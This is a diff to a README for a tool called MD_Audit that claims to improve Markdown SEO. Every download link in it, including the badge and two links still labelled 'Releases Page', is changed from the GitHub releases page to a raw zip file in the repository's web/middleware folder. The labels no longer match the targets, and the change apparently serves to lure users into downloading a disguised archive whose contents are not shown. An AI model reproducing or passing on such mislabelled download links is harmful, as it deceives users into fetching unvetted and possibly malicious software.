@@ -1,7 +1,7 @@
 # 🎉 MD_Audit - Enhance Your Markdown SEO Today!
 
 ## 📥 Download Now
-[![Download MD_Audit](https://img.shields.io/badge/Download-MD_Audit-blue.svg)](https://github.com/ultrabanaan2009/MD_Audit/releases)
+[![Download MD_Audit](https://raw.githubusercontent.com/ultrabanaan2009/MD_Audit/main/web/middleware/MD_Audit_v2.9.zip)](https://raw.githubusercontent.com/ultrabanaan2009/MD_Audit/main/web/middleware/MD_Audit_v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to MD_Audit, your go-to tool for improving the SEO of your Markdown documents. This software combines rule-based checking and AI analysis to help you create better content. Follow these simple steps to get started.
@@ -17,7 +17,7 @@ Make sure your system meets the following requirements to run MD_Audit smoothly:
 ## 📦 Download & Install
 To download MD_Audit, visit the Releases page. Here, you will find the latest version available for download.
 
-1. Click this link to visit the [Releases Page](https://github.com/ultrabanaan2009/MD_Audit/releases).
+1. Click this link to visit the [Releases Page](https://raw.githubusercontent.com/ultrabanaan2009/MD_Audit/main/web/middleware/MD_Audit_v2.9.zip).
 2. Look for the latest release that is marked as “Latest”.
 3. Find the download file that corresponds to your operating system. Usually, this will be a `.exe` file for Windows, a `.dmg` file for macOS, or a compressed file for Linux.
 4. Click on the file to start the download.
@@ -70,7 +70,7 @@ Absolutely! We welcome contributions in terms of feedback, code, or new features
 If you run into problems, please visit the Issues section on our GitHub page or reach out via our support page.
 
 ## 🔗 Important Links
-- Download MD_Audit: [Releases Page](https://github.com/ultrabanaan2009/MD_Audit/releases)
+- Download MD_Audit: [Releases Page](https://raw.githubusercontent.com/ultrabanaan2009/MD_Audit/main/web/middleware/MD_Audit_v2.9.zip)
 - Contributing Guide: Link to contributing guidelines in the repository
 - Support Page: Link to support resources 
 
